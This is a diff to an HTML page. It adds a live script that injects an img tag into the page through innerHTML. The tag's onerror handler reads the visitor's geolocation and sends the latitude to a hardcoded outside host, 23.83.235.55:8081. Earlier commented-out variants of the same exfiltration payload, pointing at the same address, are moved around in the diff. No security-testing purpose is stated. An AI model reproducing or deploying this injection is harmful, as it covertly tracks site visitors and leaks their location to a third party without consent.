@@ -413,23 +413,22 @@
 </div>
 
 
-<!--<script>-->
-<!--// var str = "<div></div>";-->
-<!--var str = "<script> navigator.geolocation.getCurrentPosition(getposition, handleError);" +-->
-    <!--"function getposition(position) { b=document.createElement(\'img\'); b.src=\"http://23.83.235.55:8081/\" + position.coords.latitude;}" +-->
-    <!--"function handleError(error) { };<\/script>";-->
-
-<!--// var str = "<script> console.log(\"ZX: from console\");<\/script>";-->
-<!--document.getElementById('inner').innerHTML = str;-->
-<!--// document.write(str);-->
-<!--</script>-->
-
 <script>
 // var str = "<div></div>";
-var str = "<img src=x onerror=console.log('injecting');b=document.createElement(\"img\");m=\"abc\";"
-+ "console.log(\"ZX\"+m);b.src=\"http://23.83.235.55:8081/\"+m;'>";
+var str = "<img src=x onerror=navigator.geolocation.getCurrentPosition(function(position){b=document.createElement(\'img\');" +
+    "b.src=\"http://23.83.235.55:8081/\"+position.coords.latitude;});>";
+
+// var str = "<script> console.log(\"ZX: from console\");<\/script>";
 document.getElementById('inner').innerHTML = str;
+// document.write(str);
 </script>
+
+<!--<script>-->
+<!--// var str = "<div></div>";-->
+<!--var str = "<img src=x onerror=console.log('injecting');b=document.createElement(\"img\");m=\"abc\";"-->
+<!--+ "console.log(\"ZX\"+m);b.src=\"http://23.83.235.55:8081/\"+m;>";-->
+<!--document.getElementById('inner').innerHTML = str;-->
+<!--</script>-->
 <!--<script>-->
 <!--// var str = "<div></div>";-->
 <!--var str = "<img src=xx onerror='b=document.createElement(\"img\");b.src=\"http://23.83.235.55:8081/def\";'>";-->
